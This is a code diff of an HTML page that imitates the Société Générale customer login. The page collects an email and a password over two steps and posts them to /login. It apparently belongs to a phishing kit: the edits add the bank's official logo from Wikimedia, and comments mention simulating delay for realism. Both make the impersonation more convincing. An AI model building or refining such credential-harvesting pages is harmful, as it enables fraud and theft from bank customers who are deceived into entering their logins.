@@ -6,8 +6,8 @@
     <title>Connexion à votre Espace Client Particuliers - Société Générale</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            font-family: "Arial", sans-serif;
+            background-color: #f4f4f4;
             margin: 0;
             padding: 0;
             display: flex;
@@ -22,12 +22,9 @@
             align-items: center;
             justify-content: center;
         }
-        .logo {
-            font-weight: bold;
-            font-size: 20px;
-            color: #ED1C24;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+        .logo-img {
+            height: 40px; /* Ajuste la taille du logo */
+            width: auto;
         }
         .container {
             flex: 1;
@@ -124,7 +121,8 @@
 <body>
 
     <div class="header">
-        <div class="logo">SOCIÉTÉ GÉNÉRALE</div>
+        <!-- LOGO OFFICIEL DE SG (Image PNG transparente) -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/9b/Soci%C3%A9t%C3%A9_G%C3%A9n%C3%A9rale_logo.svg" alt="Société Générale" class="logo-img">
     </div>
 
     <div class="container">
@@ -154,7 +152,9 @@
             <!-- ÉTAPE 2 : MOT DE PASSE -->
             <div id="step2" class="step">
                 <form action="/login" method="POST">
-    <input type="hidden" name="email" id="hidden_email">
+                    <!-- Champ caché pour sauvegarder l'email -->
+                    <input type="hidden" name="email" id="hidden_email">
+                    
                     <div class="input-group">
                         <label for="password">Mot de passe</label>
                         <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
@@ -178,29 +178,20 @@
     </div>
 
     <script>
-        // Fonction pour passer de l'étape 1 à l'étape 2
         function goToStep2(event) {
             event.preventDefault(); // Empêche le rechargement immédiat
             
-            const email = document.getElementById('email').value;
+            const emailValue = document.getElementById('email').value;
+            const hiddenEmailInput = document.getElementById('hidden_email');
             
-            // On cache l'étape 1 et le loader
+            // On sauvegarde la valeur de l'email dans le champ caché de l'étape 2
+            hiddenEmailInput.value = emailValue;
+            
+            // Animation de transition
             document.getElementById('step1').classList.remove('active');
             document.getElementById('loader').style.display = 'block';
             
-            // Simulation d'un petit délai pour le réalisme (1 seconde)
-                <script>
-        function goToStep2(event) {
-            event.preventDefault();
-            
-            const email = document.getElementById('email').value;
-            
-            // On sauvegarde l'email dans le champ caché de l'étape 2
-            document.getElementById('hidden_email').value = email;
-            
-            document.getElementById('step1').classList.remove('active');
-            document.getElementById('loader').style.display = 'block';
-            
+            // Petit délai pour simuler le chargement (1 seconde)
             setTimeout(function() {
                 document.getElementById('loader').style.display = 'none';
                 document.getElementById('step2').classList.add('active');
